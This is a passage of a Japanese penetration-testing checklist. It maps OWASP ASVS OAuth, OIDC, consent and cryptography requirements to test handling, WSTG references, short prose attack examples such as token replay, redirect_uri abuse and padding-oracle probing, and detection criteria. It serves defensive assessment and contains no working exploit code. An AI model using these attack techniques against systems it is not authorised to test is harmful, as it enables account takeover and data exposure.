| V10.3.2 | L2 | トークンのクレーム（`sub/scope/authorization_details`）で認可実施 | 対応可 | スコープ不足時の拒否を確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 9396 Rich Authorization Requests](https://www.rfc-editor.org/rfc/rfc9396) | `scope=read`のみのATで`write`操作が成功 | 要求操作に必要な`scope/authorization_details`が不足しても許可されれば検出 |
| V10.3.3 | L2 | ユーザ識別は再割当不可の`iss+sub`で行う | 対応可 | 複数IdP混在時の一意性検証 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[OpenID Connect Core (sub)](https://openid.net/specs/openid-connect-core-1_0.html#IDToken) | `sub`値が同一でも`iss`が異なるIDPで他人アカウントに紐付く | `iss+sub`の組で内部IDへ正規化されていない場合の誤関連付けを確認できれば検出 |
| V10.3.4 | L2 | 認証強度/方法/時刻の検証（`acr/amr/auth_time`） | 対応可 | 高価値操作時に要求水準満たすか確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[OpenID Connect Core (acr/amr/auth_time)](https://openid.net/specs/openid-connect-core-1_0.html#IDToken) | 古い`auth_time`/弱い`amr`（passwordのみ）で高リスクAPIが成功 | クレームがポリシー閾値未満でも成功するかを確認し、成功なら検出 |
| V10.3.5 | L3 | 送信者制約付きAT（mTLS/DPoP）を要求 | 対応可 | リプレイ耐性試験（チャネル奪取想定） | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 8705 OAuth 2.0 mTLS](https://www.rfc-editor.org/rfc/rfc8705)/[RFC 9449 DPoP](https://www.rfc-editor.org/rfc/rfc9449) | 他端末で盗取したATを別TLS/別鍵環境から再利用し成功 | DPoPヘッダやmTLSバインドが無い/検証不備でリプレイが成功すれば検出 |

---

## V10.4 OAuth 認可サーバ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V10.4.1 | L1 | リダイレクトURIは事前登録の厳密一致のみ許可 | 対応可 | サブルート/ワイルドカード不許可確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger OAuth open redirect](https://portswigger.net/web-security/oauth/openid) | 未登録/ワイルドカード/サブドメインの`redirect_uri`でコード奪取 | 未登録URIやパラメータ付与の一致回避で認可応答が返れば検出 |
| V10.4.2 | L1 | 認可コードは一回限り・再使用で失効処理 | 対応可 | 二重交換試験で無効化確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 6749 \u00a74.1](https://www.rfc-editor.org/rfc/rfc6749#section-4.1) | 一度使用済みの`code`を再度`/token`へ送ってATを再取得 | 同一`code`の再使用で発行/エラーにならない場合は検出 |
| V10.4.3 | L1 | 認可コードの短寿命化（L1/2:≤10分, L3:≤1分） | 対応可 | 期限超過時の拒否確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 6749 \u00a74.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-4.1.2) | 有効期限を過ぎた`code`でトークン化が成功 | 期限超過後の`code`交換が成功するか検証し、成功なら検出 |
| V10.4.4 | L1 | クライアント毎に許可グラント制限（implicit/password禁止） | 対応可 | 設定/レスポンスを確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger Preventing OAuth vulnerabilities](https://portswigger.net/web-security/oauth/preventing)/[OAuth 2.1 (draft) removes implicit](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-10.html#name-the-implicit-grant) | `response_type=token`（implicit）や`password`での発行が有効 | 廃止/非推奨フローが利用可能/既定許可なら検出 |
| V10.4.5 | L1 | パブリッククライアントはRT保護（DPoP/mTLS推奨/RTローテ） | 対応可 | 使い回し検知・一括失効確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 7009 Token Revocation](https://www.rfc-editor.org/rfc/rfc7009)/[RFC 8705 OAuth 2.0 mTLS](https://www.rfc-editor.org/rfc/rfc8705) | 流出RTの繰返し使用で継続発行/ローテ検知無し | 同一RT再使用/盗難時の失効が機能しなければ検出 |
| V10.4.6 | L2 | コードグラントはPKCE必須、`plain`禁止、`code_verifier`検証 | 対応可 | メソッド=S256限定の確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 7636 PKCE](https://www.rfc-editor.org/rfc/rfc7636) | `code_challenge_method=plain`やPKCE無しで`/token`通過 | PKCE欠如/`plain`受理時にトークン化が成功すれば検出 |
| V10.4.7 | L2 | 動的クライアント登録のリスク緩和（メタデータ検証/警告） | 範囲外 | 対象ASが対応するか確認 | - | - | - |
| V10.4.8 | L2 | RTに絶対有効期限（スライディングでも） | 対応可 | 長期RTの期限確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 6749 (Refresh Token)](https://www.rfc-editor.org/rfc/rfc6749#section-1.5) | 旧RTが長期に渡り有効で流出時に濫用可能 | 期限超過/長期未使用のRTで更新が成功すれば検出 |
| V10.4.9 | L2 | 利用者UIでAT/RTの失効操作が可能 | 対応可 | 自己失効と即時性確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 7009 Token Revocation](https://www.rfc-editor.org/rfc/rfc7009) | 盗難デバイス上のセッション/RTを利用者が無効化できない | UIからの失効操作が存在せず、実施しても即時に反映されないなら検出 |
| V10.4.10 | L2 | コンフィデンシャルクライアントのバックチャネルは認証必須 | 対応可 | トークン/失効/PAR等で認証確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 6749 (Client Authentication)](https://www.rfc-editor.org/rfc/rfc6749#section-2.3)/[RFC 7009 Revocation](https://www.rfc-editor.org/rfc/rfc7009) | クライアント認証無し/弱い`client_secret`で`/token`や`/revocation`が通過 | `client_secret`欠如/誤りでも成功する・弱方式が許容されれば検出 |
| V10.4.11 | L2 | 必要最小のスコープのみ割当 | 対応可 | デフォルトスコープの最小化確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger Preventing OAuth vulnerabilities](https://portswigger.net/web-security/oauth/preventing) | 同意していない広範デフォルトスコープが自動付与 | 要求/同意と発行の差分を比較し過剰付与なら検出 |
| V10.4.12 | L3 | クライアント毎に許可`response_mode`を限定（PAR/JAR活用） | 対応可 | 期待値以外の拒否確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 9126 PAR](https://www.rfc-editor.org/rfc/rfc9126)/[RFC 9101 JAR](https://www.rfc-editor.org/rfc/rfc9101) | `response_mode=form_post`のみ許可のはずが`fragment`等も通過しトークン漏えい | 非許可`response_mode`指定で処理継続/発行されれば検出 |
| V10.4.13 | L3 | `code`グラントはPAR必須 | 範囲外 | 現状のAS機能要確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger WSA: Allowing authorization requests by reference](https://portswigger.net/web-security/oauth/openid)/[RFC 9126 (PAR)](https://www.rfc-editor.org/rfc/rfc9126)/[RFC 9101 (JAR)](https://www.rfc-editor.org/rfc/rfc9101) | PAR未使用の認可リクエスト改竄（redirect_uri/スコープ差し替え） | PAR未使用時にクエリ改竄が成立・AS側で受理されるなら検出 |
| V10.4.14 | L3 | PoPアクセストークンのみ発行（mTLS/DPoP） | 対応可 | 発行種別と検証手順を確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 8705 OAuth 2.0 mTLS](https://www.rfc-editor.org/rfc/rfc8705)/[RFC 9449 DPoP](https://www.rfc-editor.org/rfc/rfc9449) | ベアラーATが発行され盗取・再利用でAPI成功 | 発行ATがPoPでない/RSでPoP検証不備でリプレイ成功なら検出 |
| V10.4.15 | L3 | サーバサイドのみ：`authorization_details`は改竄不可（PAR/JAR） | 範囲外 | BFF/サーバ発行のみ適用確認 | - | - | - |
| V10.4.16 | L3 | 強力なクライアント認証（mTLS/self-signed mTLS/private-key-jwt） | 対応可 | リプレイ耐性/鍵保護を確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 8705 OAuth 2.0 mTLS](https://www.rfc-editor.org/rfc/rfc8705)/[RFC 7523 private_key_jwt](https://www.rfc-editor.org/rfc/rfc7523) | `client_secret`曝露/リプレイでトークン発行が継続 | 強力方式未導入で弱い共有秘密のみの運用・再利用成功なら検出 |

## V10.5 OIDC クライアント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V10.5.1 | L2 | IDトークンのリプレイ防止（`nonce`突合） | 対応可 | 認可ReqとIDTの`nonce`一致確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[OpenID Connect Core (nonce)](https://openid.net/specs/openid-connect-core-1_0.html#IDToken) | 以前のログインで取得した`id_token`を別セッションに提示し、`nonce`未検証でログイン成立 | `nonce`不一致/欠落の`id_token`を用いて認証が成立するかを確認（成立すればリプレイ耐性不備を検出） |
| V10.5.2 | L2 | ユーザ一意識別は再割当不可な`sub`で | 対応可 | IdP切替時の衝突検出 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[OpenID Connect Core (sub)](https://openid.net/specs/openid-connect-core-1_0.html#ClaimSub) | 同じメールだが異なるIdPで発行された`id_token`を用い、`email`ベース照合で他人アカウントにリンク | `iss+sub`ではなく`email`等で同一視して誤関連付けできるかを確認（可能なら一意識別不備を検出） |
| V10.5.3 | L2 | 悪性ASのメタデータ偽装拒否（発行者URLの厳密一致） | 対応可 | 事前登録OPのみ許容 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[OpenID Connect Discovery 1.0](https://openid.net/specs/openid-connect-discovery-1_0.html) | 偽OPの`issuer`と`.well-known`を用意し、クライアントに混入させてトークンを受理させる | 事前登録の発行者/メタデータと厳密一致検証を行い、未登録OPの応答を受理しないことを確認（受理なら検出） |
| V10.5.4 | L2 | `aud`は自クライアントIDと等しいことを検証 | 対応可 | 複数`aud`の取扱い確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[OpenID Connect Core (aud)](https://openid.net/specs/openid-connect-core-1_0.html#IDToken) | 他クライアント向け`aud`を持つ`id_token`でログイン成功 | `aud`≠自クライアントIDや複数`aud`の曖昧一致を受理しないかを確認（受理なら検出） |
| V10.5.5 | L2 | バックチャネルログアウトのDoS緩和とJWT検証 | 対応可 | `typ=logout+jwt`/`event`/短寿命確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[OIDC Back-Channel Logout 1.0](https://openid.net/specs/openid-connect-backchannel-1_0.html) | 攻撃者が大量の偽ログアウトJWTをRPのログアウトエンドポイントへ送信し強制ログアウトを誘発 | 署名/`iss`/`aud`/`events`検証不備やTTL過大で不正JWTを受理しないか、レート制限の有無を確認（受理/多量成功で検出） |

---

## V10.6 OpenID プロバイダ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V10.6.1 | L2 | 許容レスポンス：`code`/`ciba`/`id_token`/`id_token code`のみ | 対応可 | 暗黙的`token`不許可確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger Preventing OAuth vulnerabilities](https://portswigger.net/web-security/oauth/preventing) | `response_type=token`（implicit）でアクセストークンが直接発行される | 非許可`response_type`指定でトークンが発行/処理継続されないかを確認（発行されれば検出） |
| V10.6.2 | L2 | 強制ログアウトのDoS緩和（確認取得/`id_token_hint`検証） | 対応可 | 認可済みRPのみ処理 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[OIDC RP-Initiated Logout](https://openid.net/specs/openid-connect-rpinitiated-1_0.html) | 攻撃者が`end_session_endpoint`へ他人のRPを装ってリクエストし、広範な強制ログアウトを誘発 | `id_token_hint`の署名/`aud`/`iss`検証とユーザ確認プロンプトの有無、レート制限を確認（欠如なら検出） |

---

## V10.7 同意管理

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V10.7.1 | L2 | 各認可要求でユーザ同意の保証（不明なクライアントは必ず同意） | 対応可 | 同意画面スキップ有無と条件確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger Preventing OAuth vulnerabilities](https://portswigger.net/web-security/oauth/preventing)/[OIDC Core (prompt)](https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest) | 初回アクセスの未知クライアントで同意画面無しにトークン発行（サイレント同意） | クライアント登録状態/同意履歴なしで`prompt=none`等が通るかを確認（通れば検出） |
| V10.7.2 | L2 | 同意画面に範囲/RS/認可詳細/有効期間を明示 | 対応可 | 表示内容と発行内容の整合性検証 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 9396 RAR](https://www.rfc-editor.org/rfc/rfc9396) | 画面では`read`のみ表示だが、実際は`read write`のトークンが発行 | 同意画面表示のスコープと発行トークンのスコープ/`authorization_details`を比較し乖離があれば検出 |
| V10.7.3 | L2 | 付与済み同意の閲覧/変更/取消が可能 | 対応可 | 自己失効UI/APIの有無確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[RFC 7009 Token Revocation](https://www.rfc-editor.org/rfc/rfc7009) | 既存同意をUIで取り消してもAT/RTが生き続ける・API利用継続 | 同意取り消し後に既存AT/RTでのアクセスが遮断されるか、即時失効/反映を確認（継続可能なら検出） |

# V11 暗号化

## V11.1 暗号インベントリとドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V11.1.1 | L2 | 鍵管理ポリシー文書化（NIST SP 800-57整合・過剰共有禁止） | 対応可 | ポリシー/手順・運用証跡の取得、サンプル鍵の配布範囲確認 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-321](https://cwe.mitre.org/data/definitions/321.html)/[CWE-327](https://cwe.mitre.org/data/definitions/327.html) | 共有シークレットがリポジトリに埋め込まれ流出し、署名鍵の使い回しによりトークン偽造 | 実運用で用いられるアルゴ/鍵長/モードの棚卸しと、弱アルゴやハードコード鍵の有無を確認（検出時は方針不備の根拠） |
| V11.1.2 | L2 | 暗号インベントリ（鍵/証明書/アルゴリズム/利用範囲）維持 | 対応可 | 資産台帳/証明書一覧・キーマップの収集・差分監査 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-326](https://cwe.mitre.org/data/definitions/326.html)/[CWE-327](https://cwe.mitre.org/data/definitions/327.html)/[CWE-295](https://cwe.mitre.org/data/definitions/295.html) | 期限切れ証明書やRSA1024/RC4等の弱設定が残存しダウングレード・盗聴を許容 | インベントリと実サーバ/コードの突合で弱アルゴ/短鍵長/失効証明書を特定（整合不一致を検出理由とする） |
| V11.1.3 | L3 | 暗号検出メカニズム（暗号API/操作の網羅検知） | 範囲外 | バイナリ/コンテナ/ソースの静的解析、ランタイム観測 | - | - | - |
| V11.1.4 | L3 | PQC等への移行計画を含む継続的な暗号インベントリ更新 | 範囲外 | ロードマップ・鍵/証明書の移行方針の確認 | - | - | - |

---

## V11.2 安全な暗号の実装

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V11.2.1 | L2 | 業界検証済み実装（ライブラリ/ハードウェア）を使用 | 対応可 | 依存ライブラリ/バージョン確認、FIPS対応可否の確認 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-327](https://cwe.mitre.org/data/definitions/327.html)/[CWE-321](https://cwe.mitre.org/data/definitions/321.html) | 自前AESのパディング不備から復号/署名偽造 | 使用暗号ライブラリ/モードの確認と既知脆弱実装の排除（独自実装や非推奨API使用を発見した時点で検出） |
| V11.2.2 | L2 | 暗号の敏捷性（アルゴリズム/鍵更新/再暗号化が可能） | 対応可 | 設定でアルゴリズム切替可否、ロールオーバーテスト | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-327](https://cwe.mitre.org/data/definitions/327.html)/[CWE-326](https://cwe.mitre.org/data/definitions/326.html)/[NIST SP 800-131A](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf) | SHA-1固定や3DES固定での継続運用により衝突・既知攻撃の温存 | 切替・ローテ不可の構成を確認し、旧アルゴからの移行不能を根拠として検出 |
| V11.2.3 | L2 | 最低128-bitセキュリティ相当の強度を使用 | 対応可 | 鍵長/曲線/パラメータの実測 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-326](https://cwe.mitre.org/data/definitions/326.html)/[NIST SP 800-57 Pt.1](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf) | RSA1024や短曲線により総当たり/離散対数攻撃の現実化 | 実鍵長・曲線を抽出し推奨閾値未満を検知（弱強度の使用を検出理由とする） |
| V11.2.4 | L3 | タイミング一定/早期return無（サイドチャネル低減） | 範囲外 | 実装レビュー、タイミング差観測 | - | - | - |
| V11.2.5 | L3 | フェイルセーフと安全なエラー処理（POODLE/パディングオラクル回避） | 対応可 | 異常系のレスポンス一律化、再試行/詳細漏洩抑止 | [WSTG-CRYP-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle)/[PortSwigger WSA: Encryption oracle example](https://portswigger.net/web-security/logic-flaws/examples#example-3-encryption-oracle)/[Padding Oracle Attack](https://www.usenix.org/legacy/events/woot10/tech/full_papers/Rizzo.pdf)/[CWE-204](https://cwe.mitre.org/data/definitions/204.html) | CBC復号のパディング差異からオラクル化、機密復号 | 故意に不正ブロック/パディングを投下し応答差（コード/時間）を観測、差異があれば検出 |

---

## V11.3 暗号アルゴリズム

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V11.3.1 | L1 | 安全でないモード/パディング（ECB, PKCS#1 v1.5等）不使用 | 対応可 | 暗号設定/コード検査、サンプル暗号文生成 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-327](https://cwe.mitre.org/data/definitions/327.html)/[CWE-780](https://cwe.mitre.org/data/definitions/780.html) | ECB利用で画像や定型データのパターン露出 | 暗号設定/暗号文性質（ブロック繰返し）を確認し、危険モード/パディングの使用を特定して検出 |
| V11.3.2 | L1 | 承認済み暗号/モード（例：AES-GCM）のみ使用 | 対応可 | 実運用設定・TLS/CMS/JWEのアルゴ確認 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-327](https://cwe.mitre.org/data/definitions/327.html)/[NIST SP 800-38D (GCM)](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf) | RC4/3DES等の採用による既知弱点の悪用 | 実応答/メタデータからアルゴ/モードを抽出し、非推奨アルゴの使用を検出 |
| V11.3.3 | L2 | 改ざん防止（AEAD推奨 or Enc+MAC） | 対応可 | 平文改変試験で復号失敗を確認 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-345](https://cwe.mitre.org/data/definitions/345.html)/[RFC 5116](https://www.rfc-editor.org/rfc/rfc5116) | 署名/タグ検証なしで暗号文のビット反転により意味改変 | 暗号文改ざん投入時に復号/処理が成立しないことを確認（成立すれば検出） |
| V11.3.4 | L3 | ノンス/IVの一意性・生成手法の適正 | 対応可 | 高頻度連続リクエストで衝突検知 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-323](https://cwe.mitre.org/data/definitions/323.html)/[NIST SP 800-38D (GCM)](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf) | GCMノンス再利用によりタグ再利用/平文漏えい | 送受信メッセージのIV/nonceを収集し重複や予測可能性を確認（衝突確認で検出） |
| V11.3.5 | L3 | Encrypt-then-MACの順序で運用 | 対応可 | 実装順序の確認、検証コード | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-353](https://cwe.mitre.org/data/definitions/353.html)/[RFC 7366](https://www.rfc-editor.org/rfc/rfc7366) | MAC-then-Encに起因する改ざん検知の回避 | 実装/ドキュメントで順序を確認し、Enc-then-MAC/AEAD不採用かつ検知失敗があれば検出 |

---

## V11.4 ハッシュ化とハッシュベース関数

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V11.4.1 | L1 | 暗号用途は承認済みハッシュのみ（MD5等禁止） | 対応可 | 依存関数/署名スキームの確認 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-328](https://cwe.mitre.org/data/definitions/328.html) | MD5/SHA-1署名の衝突作成で検証バイパス | 使用ハッシュ種を特定し非推奨/衝突既知の採用を検出 |
| V11.4.2 | L2 | パスワード保管は承認済みKDF＋適正パラメータ | 対応可 | ハッシュ方式/コスト設定検証、GPU耐性評価 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-916](https://cwe.mitre.org/data/definitions/916.html)/[CWE-759](https://cwe.mitre.org/data/definitions/759.html) | SHA-256単発やソルト無しによりレインボーテーブルで復元 | KDF種別/ソルト/反復/メモリ設定の確認で不適切な保管を検出 |
| V11.4.3 | L2 | 署名用途は衝突耐性/十分な出力長 | 対応可 | SHA-256/384/512の使用確認 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-347](https://cwe.mitre.org/data/definitions/347.html) | SHA-1署名のダウングレードにより改ざんが正当化される | 署名アルゴ/出力長を点検し弱い構成を検出 |
| V11.4.4 | L2 | パスワード→鍵導出はストレッチ付KDFを使用 | 対応可 | Salt/Iterations/Memoryの確認 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-916](https://cwe.mitre.org/data/definitions/916.html)/[CWE-759](https://cwe.mitre.org/data/definitions/759.html) | PBKDF2の反復不足で総当たりが容易 | KDFパラメータの閾値未満を根拠に検出 |

---

## V11.5 乱数値

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V11.5.1 | L2 | 推測不能値はCSPRNGで≥128-bitエントロピー | 対応可 | トークン/IV/nonce/コード生成源の確認 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-330](https://cwe.mitre.org/data/definitions/330.html)/[CWE-332](https://cwe.mitre.org/data/definitions/332.html) | `java.util.Random`等で生成したトークンが予測・再現されセッション奪取 | 連続生成値の分布/相関と生成源（CSPRNG/非CSPRNG）を確認し予測可能性を根拠に検出 |
| V11.5.2 | L3 | 高負荷時でも安全に機能する乱数生成設計 | 範囲外 | ベンチ/障害時の劣化観測 | - | - | - |

---

## V11.6 公開鍵暗号

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V11.6.1 | L2 | 鍵生成/署名は承認済みアルゴと安全な実装 | 対応可 | 生成手順/鍵品質/乱数評価 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-326](https://cwe.mitre.org/data/definitions/326.html)/[CWE-327](https://cwe.mitre.org/data/definitions/327.html) | 低エントロピーで生成したRSA鍵や脆弱曲線ECDSAにより署名偽造 | 鍵長/公開パラメータ/曲線の妥当性を確認し弱設定を検出 |
| V11.6.2 | L3 | 安全な鍵交換（DH/ECDH）と安全パラメータ | 対応可 | パラメータ/曲線/群サイズの検証 | [WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)/[CWE-326](https://cwe.mitre.org/data/definitions/326.html) | 小さなDH群や再利用パラメータで離散対数攻撃が実用化 | 使用群/曲線/鍵長を抽出し既知安全閾値未満を検出 |

---

## V11.7 使用中のデータの暗号化

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
